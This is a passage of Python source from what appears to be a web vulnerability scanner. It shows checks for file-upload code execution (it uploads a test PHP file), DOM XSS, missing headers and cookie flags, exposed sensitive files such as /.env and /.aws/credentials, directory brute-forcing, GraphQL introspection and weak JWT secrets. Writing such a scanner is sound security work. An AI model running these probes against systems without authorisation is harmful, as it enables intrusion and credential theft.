                  param=ff, resp=r, cwe="CWE-434")
        # 2) script upload — execution?
        sname = "wscan_shell.php"
        code = f"<?php echo \"WS\" . (7331*7); ?>"
        r = client.fetch_multipart(action, plain_fields,
                                   {ff: (sname, code, "application/x-php")})
        found = _locate_upload(ctx, action, sname, "51317")
        if found:
            F.add("Critical", "File Upload — Remote Code Execution", found,
                  "An uploaded PHP file executes on the server "
                  "(7331*7 was computed to 51317). Full server compromise.",
                  proof=f"GET {found} -> 51317", param=ff, resp=r, cwe="CWE-434")
            continue
        dbl = "wscan_shell.php.txt"
        r = client.fetch_multipart(action, plain_fields,
                                   {ff: (dbl, code, "text/plain")})
        found = _locate_upload(ctx, action, dbl, "51317")
        if found:
            F.add("Critical", "File Upload — Remote Code Execution (double ext)",
                  found, "A .php.txt upload is executed as PHP by the server.",
                  proof=f"GET {found} -> 51317", param=ff, resp=r, cwe="CWE-434")


def _locate_upload(ctx, action, fname, needle):
    parts = urllib.parse.urlsplit(action)
    root = f"{parts.scheme}://{parts.netloc}"
    adir = parts.path.rsplit("/", 1)[0]
    candidates = [f"{root}/uploads/{fname}", f"{root}/upload/{fname}",
                  f"{root}/files/{fname}", f"{root}{adir}/{fname}",
                  f"{root}/static/uploads/{fname}", f"{root}/media/{fname}",
                  f"{root}/{fname}"]
    for cand in candidates:
        r = ctx.client.fetch(cand)
        if r.status == 200 and needle in (r.body or ""):
            return cand
    return ""


# ------------------------------------------------------------------ DOM XSS (static source->sink)

DOM_SOURCES = [r"location\s*\.\s*(hash|search|href|pathname)", r"document\s*\.\s*(URL|documentURI|referrer)",
               r"window\s*\.\s*name", r"localStorage", r"sessionStorage",
               r"\.postMessage\s*\("]
DOM_SINKS = [r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\s*\.\s*write\s*\(",
             r"eval\s*\(", r"insertAdjacentHTML\s*\(", r"\$\s*\([^)]*\)\s*\.\s*html\s*\(",
             r"setTimeout\s*\(\s*['\"]", r"\.src\s*=.*location"]


def dom_xss_check(ctx, pages, js_urls):
    client, F = ctx.client, ctx.findings
    blobs = []  # (label, text)
    for url, resp in pages:
        for m in re.finditer(r"<script[^>]*>(.*?)</script>", resp.body or "",
                             re.S | re.I):
            if m.group(1).strip():
                blobs.append((url, m.group(1)))
    for js in js_urls[:10]:
        r = client.fetch(js)
        if r.status == 200 and r.body:
            blobs.append((js, r.body))
    for label, code in blobs:
        srcs = [p for p in DOM_SOURCES if re.search(p, code)]
        sinks = [p for p in DOM_SINKS if re.search(p, code)]
        if srcs and sinks:
            line_no = 1
            for i, line in enumerate(code.splitlines(), 1):
                if any(re.search(p, line) for p in DOM_SINKS):
                    line_no = i
                    break
            F.add("Medium", "DOM XSS (potential, source→sink)", label,
                  "Client-side code reads attacker-controllable data and passes "
                  "it to a dangerous sink without sanitization (static analysis; "
                  "confirm in a browser).",
                  proof=f"sources={len(srcs)} sinks={len(sinks)}; sink near line "
                        f"{line_no}: {code.splitlines()[line_no-1].strip()[:140]}",
                  confidence="Needs manual confirmation", cwe="CWE-79")


# ------------------------------------------------------------------ headers / cookies / misc

SECURITY_HEADERS = {
    "content-security-policy": ("Medium", "No restriction on script sources; amplifies any XSS."),
    "x-frame-options": ("Low", "Page can be framed — clickjacking."),
    "x-content-type-options": ("Low", "MIME sniffing possible."),
    "strict-transport-security": ("Low", "No forced HTTPS upgrade."),
    "referrer-policy": ("Info", "Full URLs may leak to third parties."),
    "permissions-policy": ("Info", "Browser features not restricted."),
}


def headers_check(ctx, pages):
    F = ctx.findings
    if not pages:
        return
    url, resp = pages[0]
    for name, (sev, why) in SECURITY_HEADERS.items():
        if name not in resp.headers:
            if name == "strict-transport-security" and not url.startswith("https"):
                sev = "Info"
            F.add(sev, f"Security Header Missing: {name}", url,
                  why, resp=resp, dedupe_key=("hdr", name), cwe="CWE-693")
    server = resp.header("server")
    if server and re.search(r"\d+\.\d+", server):
        F.add("Info", "Version Disclosure: Server header", url,
              f"Server banner discloses version: {server}",
              resp=resp, dedupe_key=("server",), cwe="CWE-200")
    powered = resp.header("x-powered-by")
    if powered:
        F.add("Low", "Version Disclosure: X-Powered-By", url,
              f"X-Powered-By discloses: {powered}",
              resp=resp, dedupe_key=("powered",), cwe="CWE-200")
    for cname, cval in ctx.client.cookies():
        pass  # flags audited from raw Set-Cookie below
    seen_cookies = set()
    for _u, r in pages:
        for k, v in r.raw_headers:
            if k.lower() != "set-cookie":
                continue
            name = v.split("=")[0].strip()
            if name in seen_cookies:
                continue
            seen_cookies.add(name)
            low = v.lower()
            if "httponly" not in low:
                F.add("Low", "Cookie Missing HttpOnly", _u,
                      f"Cookie '{name}' is readable from JavaScript.",
                      param=f"cookie:{name}", resp=r,
                      dedupe_key=("cookie", name, "httponly"), cwe="CWE-1004")
            if _u.startswith("https") and "secure" not in low:
                F.add("Low", "Cookie Missing Secure Flag", _u,
                      f"Cookie '{name}' may travel over plain HTTP.",
                      param=f"cookie:{name}", resp=r,
                      dedupe_key=("cookie", name, "secure"), cwe="CWE-614")
            if "samesite" not in low:
                F.add("Info", "Cookie Missing SameSite", _u,
                      f"Cookie '{name}' has no SameSite attribute.",
                      param=f"cookie:{name}", resp=r,
                      dedupe_key=("cookie", name, "samesite"), cwe="CWE-1275")


SENSITIVE_PATHS = [
    ("/.env", "Critical"), ("/.git/HEAD", "High"), ("/.git/config", "High"),
    ("/.svn/entries", "Medium"), ("/phpinfo.php", "Medium"),
    ("/backup.zip", "High"), ("/backup.tar.gz", "High"), ("/db.sql", "High"),
    ("/database.sql", "High"), ("/config.php.bak", "Medium"),
    ("/wp-config.php.bak", "High"), ("/.DS_Store", "Low"),
    ("/server-status", "Low"), ("/actuator/env", "High"),
    ("/actuator/health", "Info"), ("/swagger-ui.html", "Info"),
    ("/swagger-ui/", "Info"), ("/api-docs", "Info"),
    ("/.aws/credentials", "Critical"), ("/debug", "Low"),
    ("/elmah.axd", "Medium"), ("/trace.axd", "Medium"),
    ("/web.config", "Medium"), ("/composer.json", "Low"),
    ("/package.json", "Low"), ("/Dockerfile", "Low"),
    ("/.well-known/security.txt", "Info"),
]

DISCOVERY_WORDS = ["admin", "administrator", "login", "dashboard", "panel",
                   "cpanel", "api", "api/v1", "graphql", "uploads", "upload",
                   "files", "backup", "backups", "config", "test", "dev",
                   "staging", "old", "temp", "private", "internal", "console",
                   "manager", "portal", "user", "users", "account", "register",
                   "phpmyadmin", "adminer", "db", "database", "logs", "log"]


CONTENT_VALIDATORS = {
    "/db.sql": lambda r: re.search(r"(?i)insert into|create table|"
                                  r"-- .*dump|lock tables", r.body or ""),
    "/database.sql": lambda r: re.search(r"(?i)insert into|create table|"
                                        r"-- .*dump|lock tables",
                                        r.body or ""),
    "/backup.zip": lambda r: "zip" in r.header("content-type", "")
                             or (r.body or "")[:2] == "PK",
    "/backup.tar.gz": lambda r: "gzip" in r.header("content-type", "")
                                or "octet-stream" in r.header(
                                    "content-type", ""),
    "/phpinfo.php": lambda r: "PHP Version" in (r.body or "")
                              or "phpinfo()" in (r.body or ""),
    "/.git/HEAD": lambda r: "ref:" in (r.body or ""),
    "/.env": lambda r: re.search(r"^\w+=", r.body or "", re.M),
    "/.aws/credentials": lambda r: "[" in (r.body or ""),
}


def discovery_check(ctx, base, extra_paths=None, seed_dirs=None):
    client, F = ctx.client, ctx.findings
    cal = getattr(ctx, "calibrator", None)
    parts = urllib.parse.urlsplit(base)
    root = f"{parts.scheme}://{parts.netloc}"
    base_status = client.fetch(root + "/wscan-nonexistent-7391").status
    for path, sev in SENSITIVE_PATHS:
        r = client.fetch(root + path)
        if r.status == 200 and r.body:
            if cal and cal.is_soft404(r):
                continue  # the app's 'not found' page wearing a 200
            validator = CONTENT_VALIDATORS.get(path)
            if validator is not None and not validator(r):
                continue  # right status, wrong content — not the real file
            F.add(sev, f"Sensitive File Exposed: {path}", root + path,
                  "This file is reachable by anyone and can leak credentials, "
                  "source structure or configuration.",
                  proof=r.body[:160].replace("\n", " "), resp=r, cwe="CWE-538")
    for word in DISCOVERY_WORDS:
        url = f"{root}/{word}"
        if any(url == root + p for p, _ in SENSITIVE_PATHS):
            continue
        r = client.fetch(url)
        if r.status not in (200, 301, 302, 401, 403):
            continue
        if cal and r.status == 200 and cal.is_soft404(r):
            continue
        if r.status == base_status and r.status != 200:
            continue
        F.add("Info", f"Discovered Content: /{word}", url,
              f"Path exists (HTTP {r.status}). Review whether it should be "
              f"publicly reachable.", resp=r, cwe="CWE-538")
    for word in (extra_paths or []):
        url = f"{root}/{word}"
        r = client.fetch(url)
        if r.status not in (200, 301, 302, 401, 403):
            continue
        if cal and r.status == 200 and cal.is_soft404(r):
            continue
        if r.status == base_status and r.status != 200:
            continue
        F.add("Info", f"Discovered Content: /{word}", url,
              f"Path exists (HTTP {r.status}). This candidate was "
              f"LEARNED from the site's own vocabulary (URLs, fields, "
              f"scripts) rather than a fixed wordlist. Review whether "
              f"it should be publicly reachable.",
              resp=r, cwe="CWE-538")

    # ---- recursion: brute-force INSIDE every directory found, and
    # hand the live pages back so the engine scans them for vulns too.
    # One extra pass over the root words captures their statuses:
    # directories (extensionless hits that are not soft-404s) seed the
    # depth-2 sweep, and every real 200 becomes scannable surface.
    discovered = []
    root_status = {}
    for word in DISCOVERY_WORDS:
        r = client.fetch(f"{root}/{word}")
        root_status[word] = r
    dirs = set(seed_dirs or [])
    for word, r in root_status.items():
        if r.status == 200 and not (cal and cal.is_soft404(r)):
            discovered.append(f"{root}/{word}")
        if "/" in word or "." in word:
            continue
        if r.status in (200, 301, 302, 401, 403) and not (
                cal and r.status == 200 and cal.is_soft404(r)):
            dirs.add(word)
    probes = 0
    for d in sorted(dirs)[:12]:
        for word in DISCOVERY_WORDS:
            if probes >= 420 or ctx.stop.is_set():
                break
            probes += 1
            url = f"{root}/{d}/{word}"
            r = client.fetch(url)
            if r.status not in (200, 301, 302, 401, 403):
                continue
            if cal and r.status == 200 and cal.is_soft404(r):
                continue
            if r.status == base_status and r.status != 200:
                continue
            F.add("Info", f"Discovered Content: /{d}/{word}", url,
                  f"Path exists (HTTP {r.status}) inside the /{d}/ "
                  f"directory — found by recursive discovery. Review "
                  f"whether it should be publicly reachable.",
                  resp=r, cwe="CWE-538")
            if r.status == 200:
                discovered.append(url)
    return sorted(set(discovered))


def dir_listing_check(ctx, pages):
    for url, resp in pages:
        if resp.status == 200 and re.search(r"(Index of /|Directory listing for)",
                                            resp.body or ""):
            ctx.findings.add("Medium", "Directory Listing Enabled", url,
                             "The server returns a browsable directory index.",
                             resp=resp, cwe="CWE-548")


# ------------------------------------------------------------------ GraphQL

def graphql_check(ctx, base):
    client, F = ctx.client, ctx.findings
    parts = urllib.parse.urlsplit(base)
    root = f"{parts.scheme}://{parts.netloc}"
    query = {"query": "{__schema{types{name}}}"}
    for path in ("/graphql", "/api/graphql", "/v1/graphql", "/graphiql"):
        r = client.fetch(root + path, method="POST", data=None,
                         raw_body=json.dumps(query).encode(),
                         content_type="application/json")
        if r.status == 200 and "__schema" in (r.body or ""):
            m = re.search(r'"types"\s*:\s*\[(.{0,300})', r.body, re.S)
            F.add("Medium", "GraphQL Introspection Enabled", root + path,
                  "Full schema is exposed to unauthenticated users — a complete "
                  "map of the API for an attacker.",
                  proof=(m.group(1)[:250] if m else r.body[:250]),
                  resp=r, cwe="CWE-200")
            return


# ------------------------------------------------------------------ JWT

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
WEAK_SECRETS = ["secret", "password", "123456", "key", "jwtsecret", "jwt-secret",
                "your-256-bit-secret", "changeme", "admin", "test", "dev",
                "supersecret", "mysecret", "s3cr3t", "token", "auth",
                "default", "secretkey", "secret123", "qwerty", "letmein"]


def _b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_check(ctx, pages):
    client, F = ctx.client, ctx.findings
    tokens = set()
    for _name, value in client.cookies():
        if JWT_RE.fullmatch(value or ""):
            tokens.add(value)
    for _u, r in pages:
        for m in JWT_RE.finditer(r.body or ""):
            tokens.add(m.group(0))
        for k, v in r.raw_headers:
            for m in JWT_RE.finditer(v):
                tokens.add(m.group(0))
    resp0 = pages[0][1] if pages else None
    for token in list(tokens)[:5]:
        try:
            head_b64, payload_b64, sig = token.split(".")
            header = json.loads(_b64d(head_b64))
            payload = json.loads(_b64d(payload_b64))
        except Exception:
            continue
        alg = header.get("alg", "?")
        url0 = pages[0][0] if pages else ""
        if alg.lower() == "none":
            F.add("High", "JSON Web Token: alg=none accepted format", url0,
                  "A token with alg=none was found; if the server accepts it, "
                  "authentication can be forged without any key.",
                  proof=f"header={header} payload={str(payload)[:150]}",
                  resp=resp0, cwe="CWE-327")
            continue
        if alg.upper().startswith("HS"):
            signing_input = f"{head_b64}.{payload_b64}".encode()
            try:
                expected = _b64d(sig)
            except Exception:
                continue
            for secret in WEAK_SECRETS:
                calc = hmac_mod.new(secret.encode(), signing_input,
                                    hashlib.sha256).digest()
                if hmac_mod.compare_digest(calc, expected):
                    F.add("Critical", "JSON Web Token: Weak HMAC Secret", url0,
                          f"The JWT signing secret is '{secret}' — anyone can "
                          f"forge tokens for any user (e.g. flip role to admin).",
                          proof=f"alg={alg} secret='{secret}' payload="
                                f"{str(payload)[:150]}", resp=resp0, cwe="CWE-798")
                    break
            else:
                F.add("Info", "JSON Web Token Detected", url0,
                      f"JWT in use (alg={alg}); subject/claims: "
                      f"{str(payload)[:120]}. Secret not in the common-weak list.",
                      resp=resp0, cwe="CWE-327")
        if alg.upper().startswith(("RS", "PS", "ES")):
            from . import checks3 as _c3
            if not _c3.jwt_confusion_try(
                    ctx, token, header, payload, url0,
                    [u for u, _r in pages]):
                F.add("Info", "JSON Web Token Detected", url0,
                      f"JWT in use (alg={alg}); subject/claims: "
                      f"{str(payload)[:120]}. Asymmetric token; "
                      f"alg-confusion probes did not succeed.",
                      resp=resp0, cwe="CWE-327")
